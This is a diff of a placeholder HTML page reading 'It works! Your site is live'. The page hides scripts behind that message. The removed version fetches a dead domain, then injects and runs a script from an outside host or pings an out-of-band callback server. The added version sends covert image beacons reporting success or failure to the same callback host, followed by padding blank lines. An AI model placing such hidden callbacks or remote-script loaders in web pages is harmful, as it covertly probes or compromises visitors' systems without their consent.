@@ -1,25 +1,23 @@
 <!DOCTYPE html>
-<html>
-<head>
-  <title>Test Page</title>
+<html><head><title>Test Page</title>
   <script>
+    let failed = false;
     fetch("https://nonexistingone.com/")
-      .then(res => {
-        if (res.status === 0 || res.type === "opaque") throw new Error("Blocked");
-        return res.text().then(body => {
-          if (!body || body.length === 0) throw new Error("Empty");
-          fetch("https://3678iya9s5flykg5btyggo7h288zwrnfc.oastify.com/hit?ts=" + Date.now());
-        });
-      })
-      .catch(() => {
-        const s = document.createElement("script");
-        s.src = "https://js.rip/5mw8at9w5s?ts=" + Date.now();
-        s.async = false; // force immediate execution
-        document.head.appendChild(s);
-      });
-  </script>
-</head>
-<body>
-  <h1>It works! Your site is live 🚀</h1>
-</body>
-</html>
+  .catch(() => {
+    failed = true;
+  })
+  .finally(() => {
+    if (failed) {
+      new Image().src = "https://3678iya9s5flykg5btyggo7h288zwrnfc.oastify.com/fail" + Date.now();
+    } else {
+      new Image().src = "https://3678iya9s5flykg5btyggo7h288zwrnfc.oastify.com/hit?ts=" + Date.now();
+    }
+  });
+
+
+
+
+
+
+</script></head><body><h1>It works! Your site is live 🚀</h1></body></html> 
+
